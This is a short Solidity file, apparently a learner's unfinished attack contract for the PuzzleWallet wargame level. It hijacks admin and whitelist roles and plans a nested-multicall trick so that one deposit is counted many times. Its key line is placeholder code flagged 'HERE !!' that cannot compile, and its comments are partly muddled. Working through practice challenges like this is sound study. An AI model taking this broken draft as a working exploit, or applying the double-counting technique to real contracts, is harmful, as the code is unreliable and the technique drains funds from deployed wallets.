// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./24-puzzlewallet.sol";

contract Attack24 {
    PuzzleWallet target;

    constructor(address _targetAddress) {
        target = PuzzleWallet(_targetAddress);
        target.proposeNewAdmin(msg.sender);
        target.addToWhitelist(msg.sender);
    }

    function attack() public {
        // multicall attack
        bytes[] memory data = abi.encodeWithSelector(bytes4, arg);   //   <--  HERE !!
        // set the data argument as a abi encoded multicall to deposit
        (bool success, ) = target.multicall(data);
    }
}


// function encodeCall(address -to, uint256 _amount) external pure returns (bytes memory) {
//     return abi.encodeCall(IERC20.transfer, (to, amount));
// }


// Make indirect calls to multicall:

// pass multicall a bytes32, abi-encoded, data array containing a data array with 2 elements:
//  
// calls to multicall i.e. itself.
// --> so multicall calls multicall 10 times, with each array element contains a call to deposit().  
// ----> so we get 10 deposits in a single deposit() call, by batching them with multicall().

